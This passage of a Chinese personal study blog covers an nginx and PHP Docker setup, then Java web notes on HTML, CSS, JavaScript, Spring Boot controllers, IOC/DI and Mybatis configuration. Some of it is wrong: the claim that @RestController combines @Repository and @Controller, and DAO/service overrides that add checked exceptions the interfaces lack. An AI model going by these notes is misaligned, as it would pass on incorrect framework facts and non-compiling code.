#location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;


修改nginx.conf在http块中把default.conf的内容复制进去
#nginx.confuser  nginx;worker_processes  auto;error_log  /var/log/nginx/error.log notice;pid        /var/run/nginx.pid;events &#123;    worker_connections  1024;&#125;http &#123;    include       /etc/nginx/mime.types;    default_type  application/octet-stream;    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;    access_log  /var/log/nginx/access.log  main;    sendfile        on;    #tcp_nopush     on;    keepalive_timeout  65;    #gzip  on;    include /etc/nginx/conf.d/*.conf;    server &#123;    listen       80;    listen  [::]:80;    server_name  localhost;    #access_log  /var/log/nginx/host.access.log  main;    root /usr/share/nginx/www;    location / &#123;        # root   /usr/share/nginx/html;        # index  index.html index.htm;        index index.php index.html;        try_files $uri $uri/ /info.php?$query_string;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        # root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    location ~ \.php$ &#123;    #    root           html;       fastcgi_pass   php:9000;       fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;        access_log /var/log/nginx/fastcgi.log main;        include        fastcgi_params;    &#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;&#125;


测试目录挂载与端口映射vscode打开&#x2F;data&#x2F;www&#x2F;index.html
随便写点html进去
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;        &lt;title&gt;the nginx&#x27;s page made by my index.html!&lt;/title&gt;        &lt;style&gt;                html &#123;                        color-scheme: light dark;                &#125;                body &#123;                        width: 35em;                        margin: 0 auto;                        font-family: Tahoma, Verdana, Arial, sans-serif;                &#125;        &lt;/style&gt;&lt;/head&gt;&lt;body&gt;        &lt;h1&gt;the nginx&#x27;s page made by my index.html!&lt;/h1&gt;        &lt;p&gt;If you see this page, the nginx web server is successfully installed and                working. Further configuration is required.&lt;/p&gt;        &lt;p&gt;For online documentation and support please refer to                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili&lt;/a&gt;.&lt;br /&gt;                Commercial support is available at                &lt;a href=&quot;http://bilibili.com/&quot;&gt;bilibili.com&lt;/a&gt;.        &lt;/p&gt;        &lt;p&gt;&lt;em&gt;Thank you for using nginx.&lt;/em&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;


 编辑
若正常显示，证明目录挂载没有出错
如果遇到403，检查有没有进行端口映射或者工作目录下是不是没有index.html
检查php能否被解析创建index.php，写入
&lt;?php phpinfo();?&gt;



如果在浏览器中输入：
http:&#x2F;&#x2F;你的dockerhost的ip:nginx端口&#x2F;index.php

有以下结果
编辑
证明配置成功
出现的问题以及解决

nginx容器挂载目录前可以正常访问初始页面，但是进行目录挂载后就显示403：是**因为挂载的工作目录下没有index.html,**相当于挂载了一个空的目录给nginx容器，就无法访问了
环境及路径都配置好了，访问本机ip也能正常显示挂载的index.html，但是访问php文件出现直接把php文件下载下来或者显示File not found：先查看nginx的日志看一看有没有报错，然后检查default.conf和nginx.conf有没有错误，看一下location &#x2F;块下的index有没有加上index.php,如果容器使用自己创建的网络，配置文件的php块中的fastcgi_pass要写成**php容器名:映射的容器端口,**root设置为容器内的初始页面路径，astcgi_param那一行改成：fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;


最后因为在网上搜索了好多篇博客都未能彻底解决问题，所以才写了这篇博客用于记录自己的踩坑历程和用于日后参考；
因为是解决问题之后才写的博客，文中的命令也许会有差错，欢迎在评论区指正
写的不好，希望我的踩坑经历能够帮助到您，蟹蟹(｡･ω･｡)
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Docker</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-web</title>
    <url>/2025/05/24/javaweb/</url>
    <content><![CDATA[HTML参考https://www.w3cschool.cn/html/html-form.html
基本语法
基本结构
不允许交叉嵌套
正确：&lt;div&gt;    &lt;a&gt;&lt;/a&gt;&lt;/div&gt;错误：&lt;div&gt;    &lt;a&gt;&lt;/div&gt;    &lt;/a&gt;


&lt;DOCTYPE html&gt;&lt;!--这个头部是为了告诉浏览器解析HTML的标准HTML分为HTML,xhtml,HTML5等不同版本&gt;    

&lt;DOCTYPE html&gt;    &lt;html lang=&quot;en&quot;&gt;    &lt;head&gt;        &lt;meta charset=&quot;utf-8&quot;&gt;        &lt;title&gt;            test        &lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;    &lt;/body&gt;    &lt;/html&gt;

vscode中输入！+tab可以自动补全
简单页面小代码
&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;测试&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;h1&gt;欢迎来到测试页面&lt;/h1&gt;        &lt;a href=&quot;https://space.bilibili.com/375081822/favlist?fid=3135803622&amp;ftype=create &quot;&gt;好康的&lt;/a&gt;    &lt;/body&gt;&lt;/html&gt;

效果

头部信息
常用标签
&lt;b&gt;&lt;/b&gt;&lt;strong&gt;&lt;/strong&gt;&lt;!--区别在于strong标签可以优先被搜索引擎找到--&gt;


列表中也可以放链接
&lt;ul&gt;    &lt;li&gt;&lt;a href=&quot;https://space.bilibili.com/375081822/favlist?fid=3135803622&amp;ftype=create&quot;&gt;好康的&lt;/a&gt;&lt;/li&gt;    &lt;li&gt;&lt;a href=&quot;https://www.baidu.com&quot;&gt;好用的&lt;/a&gt;&lt;/li&gt;    &lt;li&gt;ccc&lt;/li&gt;&lt;/ul&gt;




锚点就像goto和标签,#作用是定位,比如.&#x2F;h1.html#chiikawa1意思就是跳转到h1.html下的chiikawa1锚点

合并单元格：由左向右,由上到下

&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;./h1.html&quot; method=&quot;GET&quot;&gt;&lt;!--用get方法将参数传到./h1.html--&gt;        &lt;input type=&quot;text&quot; name=&quot;uname&quot;&gt;&lt;br/&gt;&lt;br/&gt;&lt;!--type表示表单类型,文本框,密码框,提交按钮--&gt;        &lt;input type=&quot;password&quot; name=&quot;upass&quot;&gt;&lt;br/&gt;&lt;br/&gt;        &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;



CSS
语法
选择器：选的是中的标签名
&lt;!--css样式位于style标签中--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;GBK&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        strong&#123;font-size: 20;color: aquamarine;&#125;    &lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;strong&gt;这是CSS测试页面&lt;/strong&gt;    &lt;ul&gt;        &lt;li&gt;            &lt;a href=&quot;https://www.bilibili.com&quot;&gt;学习网站&lt;/a&gt;        &lt;/li&gt;        &lt;li&gt;CSS测试&lt;/li&gt;        &lt;li&gt;油专&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;

使用方法
1.外部样式表：

html中用link单标签引用
/*mycss.css*/h1&#123;font-size: 30;background-color: aquamarine;color: crimson;&#125;

2.内嵌方法
嵌入在style中
3.内联样式
&lt;!-- 直接将style写入标签中--&gt;&lt;ul&gt;    &lt;li style=&quot;font-size:25;color:red&quot;&gt;&lt;/li&gt;&lt;/ul&gt;

CSS2常用选择器
html选择器把html的标签作为选择器,比如h1,a,也可以用*表示对所有标签生效（可能有兼容性问题）
缺点：过于笼统,html中有很多标签是重复的
类选择器在标签中加入class属性,在创建css样式时用  （标签名）.属性值进行标记
属性名可写可不写,不写属性名,那么只要class属性值等于css样式前的类属性值,css就会对该标签生效

id选择器根据标签中的id属性的属性值进行选择
&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;GBK&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;Document&lt;/title&gt;    &lt;style&gt;        #hid&#123;font-size: 20;color: aquamarine;&#125;/*#开始*/    &lt;/style&gt;    &lt;/head&gt;&lt;body&gt;    &lt;strong&gt;这是CSS测试页面&lt;/strong&gt;    &lt;ul&gt;        &lt;li id=&quot;hid&quot;&gt;            &lt;a href=&quot;https://www.bilibili.com&quot;&gt;学习网站&lt;/a&gt;        &lt;/li&gt;        &lt;li&gt;CSS测试&lt;/li&gt;        &lt;li&gt;油专&lt;/li&gt;    &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;


关联选择器&#x2F;包含选择器
组合选择器
伪类选择器常用属性
尺寸与单位
颜色

字体属性font

文本属性

JavaScript
引入方式
书写语法

变量


数据类型&amp;运算符





parseInt()会从第一个字符开始匹配,直到遇到第一个非数字停止转换；所以如果转换的内容第一个字符就不是数字,转换结果就是NaN

Day02-06. JS-函数

js函数可以接收任意个数参数,有几个形参就接收前几个参数
Day02-07. JS-对象-Array数组


var arr = [1,2,3,4];arr[10] = &quot;佐佐木淳平&quot;;arr.forEach(function(e)&#123;//相当于匿名内部类    console.log(e);&#125;)//箭头函数简化（lambda表达式）var arr = [1,2,3,4];arr[10] = &quot;佐佐木淳平&quot;;arr.forEach((e)=&gt;&#123;    console.log(e);&#125;)//splice()参数1：起始索引 参数2：删除个数

Day02-08. JS-对象-String字符串

substring参数1：开始索引,参数2：结束索引；左闭右开
Day02-09. JS-对象-JSON
函数简化写法：
函数名()&#123;&#125;



key-value形式
key必须用双引号包围


var json_str = &#x27;&#123;&quot;name&quot;:&quot;wwwtty&quot;,&quot;password&quot;:114514&#125;&#x27;;var json_obj = JSON.parse(json_str);var json_str = JSON.stringify(json_obj);alert(json_obj.name);alert(json_str);



Day02-10. JS-对象-BOM

var res = window.confirm();//确认为true,取消为falseif(res)&#123;    alert(&quot;确定&quot;);&#125;else&#123;    alert(&quot;取消&quot;);&#125;


alert(location.href);location.href=&quot;https://www.bilibili.com&quot;;//跳转到该网址

Day02-11. JS-对象-DOM
Day02-12. JS-对象-DOM案例

可以用.innerHTML&#x3D;修改div标签内文本内容
Day02-13. JS-事件-事件绑定&amp;常见事件

&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;测试&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;&quot; method=&quot;get&quot;&gt;        &lt;input type=&quot;button&quot; value=&quot;点我&quot; id=&quot;hhh&quot;&gt;    &lt;/form&gt;    &lt;script&gt;        function on()&#123;            alert(&quot;点我干嘛?&quot;);        &#125;        document.getElementById(&quot;hhh&quot;).onclick=function()&#123;            alert(&quot;干嘛点我&quot;);        &#125;    &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;


焦点：比如光标在输入框中闪烁
Day02-14. JS-事件-案例VueDay02-15. Vue-概述

Day02-16. Vue-指令-v-bind&amp;v-model&amp;v-onDay02-17. Vue-指令-v-if&amp;v-show&amp;v-forDay02-18. Vue-指令-案例Day02-19. Vue-生命周期Ajaxnginx打包部署#vue项目目录下npm run build

打包好后会有一个dist文件夹
部署：将dist复制到nginx的&#x2F;html中,启动nginx.exe 占用80端口（默认）


若端口被占用,在nginx.conf里更改
Maven





依赖配置
&lt;dependencies&gt;        &lt;dependency&gt;                &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;                &lt;artifactId&gt;logback-classic&lt;/artifactId&gt; &lt;!--先写这个,其他idea可以代码提示--&gt;                &lt;version&gt;1.5.6&lt;/version&gt;        &lt;/dependency&gt;&lt;/dependencies&gt;


依赖传递
排除依赖依赖范围
生命周期



SpringBoot






@RestController@RestController 通常用于创建 REST API,其中每个方法的返回值都是 HTTP 响应体的一部分。这使得开发人员可以专注于业务逻辑,而不必担心视图解析和模型数据的填充。
@RequestMapping()注解在 Java 的 Spring 框架中,@RequestMapping注解用于将 HTTP 请求映射到控制器的处理方法上。这个注解可以用于类或方法上,用于定义请求的 URL 模式、HTTP 方法（如 GET、POST）、请求参数、头部信息等。

package com.example.demo.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;//请求处理类@RestControllerpublic class HelloController &#123;        //请求路径        @RequestMapping(&quot;/Hello&quot;)        public String Hello()&#123;                return &quot;Hello SpringBoot&quot;;        &#125;&#125;

HTTP协议

请求数据格式请求行,请求头,请求体

请求头与请求体之间用空行隔开

常见请求头：
User-Agent用于浏览器兼容性处理
响应数据格式相应行,响应头,响应体&#x2F;响应正文

状态码


最常见:
常见响应头
Web服务器-Tomcat
基本使用

端口冲突解决：
程序解析
创建springboot项目时要关联start.spring.io,所以创建时需要联网



起步依赖的版本依赖于父工程,版本依赖于父工程版本

Spring Boot-Web的maven依赖中已经内嵌了tomcat


请求响应请求
HttpServletRequest称为请求对象
HttpServletResponse称为响应对象

DispatcherServlet称为前端控制器&#x2F;核心控制器

postman工具
简单参数 
package com.example.demo.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class RequestController &#123;        @RequestMapping(&quot;/Args&quot;)        //请求的参数名与接收参数名必须一致,不然接收到的就是null        public String RequestController(String name,String passwd)&#123;                String response = name+&#x27;:&#x27;+passwd;                System.out.println(response);                return response;        &#125;&#125;




package com.example.demo.controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class RequestController &#123;        @RequestMapping(&quot;/Args&quot;)        //请求的参数名与接收参数名必须一致,不然接收到的就是null        public String RequestController(@RequestParam(name = &quot;name&quot;,required = true)String name, @RequestParam(name = &quot;passwd&quot;) String password)&#123;                String response = name+&#x27;:&#x27;+password;                System.out.println(response);                return response;        &#125;&#125;




实体参数
实体都放在pojo下（自己建目录）


至少要有请求参数

@RequestMapping(&quot;/simplePojo&quot;)public String simplyPojo(User user)&#123;    System.out.println(user);    return &quot;OK&quot;;&#125;


如果改变参数名字就不能封装进去,参数值为null


请求如下：




控制台输出
数组参数

@RequestMapping(&quot;/arrayParam&quot;)public String arrayParam(String[] param)&#123;    System.out.println(Arrays.toString(param));    return &quot;OK&quot;;&#125;


集合参数
不用@RequestParam会被解释成数组而非集合


日期参数


json参数
postman请求json参数方法：

url中要加上请求路径,否则报错

键名与形参对象属性名相同

使用@RequestBody标识
@RequestMapping(&quot;/jsonParam&quot;)       public String jsonParam(@RequestBody User user)&#123;               System.out.println(user);               return &quot;OK&quot;;       &#125;


路径参数单个路径

多个路径
响应@ResponseBody注解
响应字符串@RequestMapping(&quot;/str&quot;)public String stringResponse() &#123;    return &quot;Hello SpringBoot&quot;;&#125;


响应对象响应格式为json
@RequestMapping(&quot;/obj&quot;)public Address objResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    return address;&#125;


响应集合响应格式为json数组
@RequestMapping(&quot;/List&quot;)public List&lt;Address&gt; listResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    Address address2 = new Address();    address2.setProvince(&quot;福建&quot;);    address2.setCity(&quot;厦门&quot;);    List&lt;Address&gt; list = new ArrayList&lt;&gt;();    list.add(address2);    list.add(address);    return list;&#125;


统一响应结果上面三种响应格式都不同,不便于前后端开发


package com.example.demo.POJO;public class Result &#123;        //响应码 success:0 error:-1        private Integer code;        //提示信息        private String msg;        //返回数据        private Object data;        public Result() &#123;        &#125;        public Result(Integer code, String msg, Object data) &#123;                this.code = code;                this.msg = msg;                this.data = data;        &#125;        public Integer getCode() &#123;                return code;        &#125;        public void setCode(Integer code) &#123;                this.code = code;        &#125;        public String getMsg() &#123;                return msg;        &#125;        public void setMsg(String msg) &#123;                this.msg = msg;        &#125;        public Object getData() &#123;                return data;        &#125;        public void setData(Object data) &#123;                this.data = data;        &#125;        @Override        public String toString() &#123;                return &quot;Result&#123;&quot; +                        &quot;code=&quot; + code +                        &quot;, msg=&#x27;&quot; + msg + &#x27;\&#x27;&#x27; +                        &quot;, data=&quot; + data +                        &#x27;&#125;&#x27;;        &#125;        public static Result success(Object data)&#123;                return new Result(0,&quot;success&quot;,data);        &#125;                public static Result success()&#123;                return new Result(0,&quot;success&quot;,null);        &#125;                public static Result error(String errMsg)&#123;                return new Result(-1,errMsg,null);        &#125;&#125;

static方法用于快速构建Result对象
响应字符串@RequestMapping(&quot;/str&quot;)public Result stringResponse() &#123;    //return new Result(0,&quot;success&quot;,&quot;Hello SpringBoot&quot;);    return Result.success(&quot;Hello SpringBoot&quot;);&#125;


响应对象响应格式为json
@RequestMapping(&quot;/obj&quot;)public Result objResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    //return new Result(0,&quot;success&quot;,address);    return Result.success(address);&#125;


响应集合响应格式为json数组
@RequestMapping(&quot;/List&quot;)public Result listResponse() &#123;    Address address = new Address();    address.setProvince(&quot;福建&quot;);    address.setCity(&quot;泉州&quot;);    Address address2 = new Address();    address2.setProvince(&quot;福建&quot;);    address2.setCity(&quot;厦门&quot;);    List&lt;Address&gt; list = new ArrayList&lt;&gt;();    list.add(address2);    list.add(address);    //return new Result(0,&quot;success&quot;,list);    return Result.success(list);&#125;


案例
pom.xml中添加坐标&lt;dependency&gt;    &lt;groupId&gt;org.dom4j&lt;/groupId&gt;    &lt;artifactId&gt;dom4j&lt;/artifactId&gt;    &lt;version&gt;2.1.3&lt;/version&gt;&lt;/dependency&gt;

工具类XmlParserUtils
package com.example.demo.Utils;import org.dom4j.Document;import org.dom4j.DocumentException;import org.dom4j.Element;import org.dom4j.io.SAXReader;import java.io.File;import java.lang.reflect.Constructor;import java.util.ArrayList;import java.util.List;/** * XML解析工具类 * 提供将XML文件解析为Java对象列表的功能 */public class XmlParserUtils &#123;        /**         * 将XML文件解析为指定类型的对象列表         *         * @param file        XML文件路径         * @param targetClass 目标对象类型         * @param &lt;T&gt;         泛型类型         * @return 解析后的对象列表         * @throws DocumentException 如果XML解析失败         */        public static &lt;T&gt; List&lt;T&gt; parse(String file, Class&lt;T&gt; targetClass) throws DocumentException &#123;                // 1. 创建SAXReader对象用于读取XML                SAXReader reader = new SAXReader();                // 2. 读取XML文件并获取Document对象                Document document = reader.read(new File(file));                // 3. 获取XML根元素                Element rootElement = document.getRootElement();                // 4. 获取所有emp元素                List&lt;Element&gt; elements = rootElement.elements(&quot;emp&quot;);                // 5. 准备返回的结果列表                List&lt;T&gt; list = new ArrayList&lt;&gt;();                try &#123;                        // 6. 遍历集合,得到每一个emp标签                        for (Element element : elements) &#123;                                // 获取name属性                                String name = element.element(&quot;name&quot;).getText();                                // 获取age属性                                String age = element.element(&quot;age&quot;).getText();                                // 获取image属性                                String image = element.element(&quot;image&quot;).getText();                                // 获取gender属性                                String gender = element.element(&quot;gender&quot;).getText();                                // 获取job属性                                String job = element.element(&quot;job&quot;).getText();                                // 7. 获取目标类的构造方法                                Constructor&lt;T&gt; constructor = targetClass.getDeclaredConstructor(                                        String.class, Integer.class, String.class, String.class, String.class                                );                                // 8. 设置构造方法可访问（即使是私有构造方法）                                constructor.setAccessible(true);                                // 9. 使用反射创建对象实例                                T object = constructor.newInstance(                                        name,                                        Integer.parseInt(age),                                        image,                                        gender,                                        job                                );                                // 10. 将创建的对象添加到列表                                list.add(object);                        &#125;                &#125; catch (Exception e) &#123;                        throw new RuntimeException(&quot;XML解析为对象失败&quot;, e);                &#125;                return list;        &#125;&#125;

Emp类public class Emp &#123;        private String name;        private Integer age;        private String image;        private String gender;        private String job;        public Emp() &#123;        &#125;        public Emp(String name, Integer age, String image, String gender, String job) &#123;                this.name = name;                this.age = age;                this.image = image;                this.gender = gender;                this.job = job;        &#125;        public String getName() &#123;                return name;        &#125;        public void setName(String name) &#123;                this.name = name;        &#125;        public Integer getAge() &#123;                return age;        &#125;        public void setAge(Integer age) &#123;                this.age = age;        &#125;        public String getImage() &#123;                return image;        &#125;        public void setImage(String image) &#123;                this.image = image;        &#125;        public String getGender() &#123;                return gender;        &#125;        public void setGender(String gender) &#123;                this.gender = gender;        &#125;        public String getJob() &#123;                return job;        &#125;        public void setJob(String job) &#123;                this.job = job;        &#125;&#125;

处理请求类EmpController假设前端请求路径如下：

那么@RequestMapping中的路径就为”&#x2F;listEmp”
package com.example.demo.controller;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.Utils.XmlParserUtils;import org.dom4j.DocumentException;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //动态加载xml文件                String file = this.getClass().getClassLoader().getResource(&quot;emp.xml&quot;).getFile();                List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);                //2.对数据进行转换处理                //流式处理                empList.stream().forEach(emp -&gt; &#123;                        String gender = emp.getGender();                        if (&quot;1&quot;.equals(gender)) &#123;                                emp.setGender(&quot;男&quot;);                        &#125; else if (&quot;2&quot;.equals(gender)) &#123;                                emp.setGender(&quot;女&quot;);                        &#125;                        String job = emp.getJob();                        if (&quot;1&quot;.equals(job)) &#123;                                emp.setJob(&quot;老师&quot;);                        &#125; else if (&quot;2&quot;.equals(job)) &#123;                                emp.setJob(&quot;主任&quot;);                        &#125;else if(&quot;3&quot;.equals(job))&#123;                                emp.setJob(&quot;就业指导&quot;);                        &#125;                &#125;);                //3.响应数据                return Result.success(empList);        &#125;&#125;

响应结果：

分层解耦三层架构


Dao层-数据访问Dao对数据的访问方式很多（文件,数据库等）,想要灵活处理需要使用接口

package com.example.demo.Dao;import com.example.demo.POJO.Emp;import java.util.List;public interface EmpDao &#123;        //获取员工列表        public List&lt;Emp&gt; getListEmp();&#125;

它的实现类A：

package com.example.demo.Dao.impl;import com.example.demo.Dao.EmpDao;import com.example.demo.POJO.Emp;import com.example.demo.Utils.XmlParserUtils;import org.dom4j.DocumentException;import java.util.List;public class EmpDaoA implements EmpDao &#123;        @Override        public List&lt;Emp&gt; getListEmp() throws DocumentException &#123;                //1.加载并解析emp.xml                //动态加载xml文件                String file = this.getClass().getClassLoader().getResource(&quot;emp.xml&quot;).getFile();                return XmlParserUtils.parse(file, Emp.class);        &#125;&#125;

Service层-业务逻辑处理与Dao层类似,想要灵活处理,使用接口

package com.example.demo.service;import com.example.demo.POJO.Emp;import java.util.List;public interface EmpService &#123;        //返回处理后的emp列表        public List&lt;Emp&gt; ListEmp();&#125;

它的实现类：
要处理数据,需要从Dao层获取,那么需要定义Dao对象
package com.example.demo.service.impl;import com.example.demo.Dao.EmpDao;import com.example.demo.Dao.impl.EmpDaoA;import com.example.demo.POJO.Emp;import com.example.demo.service.EmpService;import org.dom4j.DocumentException;import java.util.List;public class EmpServiceA implements EmpService &#123;        //面向接口编程        private EmpDao empDao = new EmpDaoA();        @Override        public List&lt;Emp&gt; ListEmp() throws DocumentException &#123;                List&lt;Emp&gt; empList = empDao.getListEmp();                empList.stream().forEach(emp -&gt; &#123;                        String gender = emp.getGender();                        if (&quot;1&quot;.equals(gender)) &#123;                                emp.setGender(&quot;男&quot;);                        &#125; else if (&quot;2&quot;.equals(gender)) &#123;                                emp.setGender(&quot;女&quot;);                        &#125;                        String job = emp.getJob();                        if (&quot;1&quot;.equals(job)) &#123;                                emp.setJob(&quot;老师&quot;);                        &#125; else if (&quot;2&quot;.equals(job)) &#123;                                emp.setJob(&quot;主任&quot;);                        &#125; else if (&quot;3&quot;.equals(job)) &#123;                                emp.setJob(&quot;就业指导&quot;);                        &#125;                &#125;);                                return empList;        &#125;&#125;

Controller层-接收请求,响应数据需要调底下1层的接口
package com.example.demo.controller;import com.example.demo.Dao.EmpDao;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.Utils.XmlParserUtils;import com.example.demo.service.EmpService;import com.example.demo.service.impl.EmpServiceA;import org.dom4j.DocumentException;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;        private EmpService empService = new EmpServiceA();        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;


分层解耦
EmpController中的empService是Service层实现类的实例,说明这两层耦合
解决方法：容器
 

  
步骤
@Component注解在Dao层、Service实现类前加上该注解,表示将该类交给IOC容器管理,成为IOC容器中的bean
这样一来Controller层想要切换底层,直接更改@Component作用的类就行
@Componentpublic class EmpDaoA implements EmpDao &#123;        @Override        public List&lt;Emp&gt; getListEmp() throws DocumentException &#123;                //1.加载并解析emp.xml                //动态加载xml文件                String file = this.getClass().getClassLoader().getResource(&quot;emp.xml&quot;).getFile();                return XmlParserUtils.parse(file, Emp.class);        &#125;&#125;



@Autowired注解运行时,IOC容器会提供该类型的bean对象,并赋值给该变量 - 依赖注入
@RestControllerpublic class EmpController &#123;        @Autowired        private EmpService empService;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;

IOC详解Bean的声明
Controller层不用再加@Controller,因为@RestController&#x3D;@Repository+@Controller

为什么称之为@Component的衍生类？


//可以以这样的形式为Bean对象起名字@Service(&quot;Name&quot;)

注意事项
Bean组件扫描
规范：将Dao放在启动类所在包
不规范：找不到包

就需要在启动类上使用@ComponentScan

源码显示,@ComponentScan需要接受String数组作为所在包
package com.example.demo;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.context.annotation.ComponentScan;@ComponentScan(&#123;&quot;Dao&quot;,&quot;com.example.demo&quot;&#125;)@SpringBootApplicationpublic class DemoApplication &#123;        public static void main(String[] args) &#123;                SpringApplication.run(DemoApplication.class, args);        &#125;&#125;

我们为什么数组中传入两个包呢？
@SpringBootApplication中集成的@ComponentScan扫描的是启动类所在的包；
在@ComponentScan中声明其他的包会覆盖掉启动类所在的包,所以需要重新声明启动类所在的包
DI详解如果有多个相同类型的Bean：




@Primary多个相同类型的Bean,加上@Primary的那个生效




@Qualifier在@AutoWired前加上@Qualifier(“Bean名字”)
package com.example.demo.controller;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.service.EmpService;import org.dom4j.DocumentException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Qualifier;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;    	//EmpServiceA默认的bean名字        @Qualifier(&quot;empServiceA&quot;)        @Autowired        private EmpService empService;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;

@Resource与@Qualifier的区别：

@Qualifier按照类型注入

@Resource按照名称注入;使用@Resource后就不用@Autowired了
  package com.example.demo.controller;import com.example.demo.POJO.Emp;import com.example.demo.POJO.Result;import com.example.demo.service.EmpService;import jakarta.annotation.Resource;import org.dom4j.DocumentException;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.beans.factory.annotation.Qualifier;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RestController;import java.util.List;@RestControllerpublic class EmpController &#123;//        @Qualifier(&quot;empServiceA&quot;)//        @Autowired        @Resource(name = &quot;empServiceB&quot;)        private EmpService empService;        @RequestMapping(&quot;/listEmp&quot;)        public Result list() throws DocumentException &#123;                //1.加载并解析emp.xml                //2.对数据进行转换处理                List&lt;Emp&gt; empList = empService.ListEmp();                //3.响应数据                return Result.success(empList);        &#125;&#125;



Mybatis
准备工作



springboot工程

配置文件spring.application.name=Mybatis-demospring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver#数据库名spring.datasource.url=jdbc:mysql://localhost:3306/mybatis#用户名spring.datasource.username=root#密码spring.datasource.password=114514

@Mapper注解Mybatis中Mapper层其实就和Dao层差不多
在运行时，会自动生成该接口的实现类对象（代理对象），并且将该对象交给IOC容器管理
